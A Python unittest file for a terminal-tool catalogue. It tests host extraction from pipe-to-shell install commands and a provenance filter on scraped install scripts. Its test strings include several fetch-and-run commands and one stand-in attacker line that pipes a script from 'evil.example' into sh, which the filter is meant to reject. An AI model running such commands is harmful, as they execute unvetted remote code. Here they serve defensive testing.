import unittest

from tuistore import catalog
from tuistore.installer import command_urls, script_host
from tuistore.scrape import extract_methods


class ScriptHostTest(unittest.TestCase):
    def test_host_from_common_script_forms(self) -> None:
        self.assertEqual(
            script_host("curl -sS https://webinstall.dev/curlie | bash"),
            "webinstall.dev",
        )
        self.assertEqual(
            script_host(
                "curl -fsSL https://raw.githubusercontent.com/a/b/main/i.sh | sh"
            ),
            "raw.githubusercontent.com",
        )
        self.assertEqual(
            script_host("wget -qO- https://get.example.dev/x | sudo bash"),
            "get.example.dev",
        )

    def test_host_is_lowercased_and_stripped_of_port_and_credentials(self) -> None:
        # The banner must not be spoofable by casing or a `user@` prefix that
        # makes a URL *look* like it points somewhere else.
        self.assertEqual(
            script_host("iwr -useb https://user@Example.COM:443/x.ps1 | iex"),
            "example.com",
        )

    def test_non_script_command_has_no_host(self) -> None:
        self.assertIsNone(script_host("brew install ripgrep"))

    def test_first_url_wins(self) -> None:
        # The host that actually gets executed is the first one piped into
        # the shell.
        self.assertEqual(
            script_host("curl https://a.example/x | sh && echo https://b.example"),
            "a.example",
        )


class ScrapedScriptProvenanceTest(unittest.TestCase):
    URL = "https://github.com/jesseduffield/lazygit"

    def _methods(self, body: str):
        readme = "```sh\n" + body + "\n```"
        return extract_methods(readme, self.URL)

    def test_tool_name_outside_the_url_is_rejected(self) -> None:
        # This is the exact line the previous whole-line check accepted: the
        # tool name appears only in a trailing flag, never in the URL.
        methods = self._methods(
            "curl -fsSL https://evil.example/x.sh | sh -s -- --for lazygit"
        )
        self.assertEqual(methods, [])

    def test_tool_name_in_the_host_is_accepted(self) -> None:
        methods = self._methods("curl -fsSL https://lazygit.dev/install.sh | sh")
        self.assertEqual([m.kind for m in methods], ["script"])

    def test_owner_and_repo_in_a_github_raw_path_is_accepted(self) -> None:
        methods = self._methods(
            "curl -fsSL "
            "https://raw.githubusercontent.com/jesseduffield/lazygit/master/i.sh | sh"
        )
        self.assertEqual([m.kind for m in methods], ["script"])

    def test_non_script_methods_are_unaffected(self) -> None:
        methods = self._methods("brew install lazygit")
        self.assertEqual([(m.kind, m.command) for m in methods], [("brew", "brew install lazygit")])


class ShippedCatalogScriptTest(unittest.TestCase):
    def test_every_shipped_script_method_still_passes_the_filter(self) -> None:
        cat = catalog.load()
        checked = 0
        for entry in cat.entries:
            repo = entry.repo
            if not repo:
                continue
            owner_l, repo_l = repo[0].lower(), repo[1].lower()
            for m in entry.methods:
                if m.kind != "script":
                    continue
                urls = " ".join(command_urls(m.command)).lower()
                self.assertTrue(
                    owner_l in urls or repo_l in urls,
                    f"{entry.name}: {m.command!r} no longer passes the provenance filter",
                )
                checked += 1
        self.assertGreater(checked, 0)


if __name__ == "__main__":
    unittest.main()
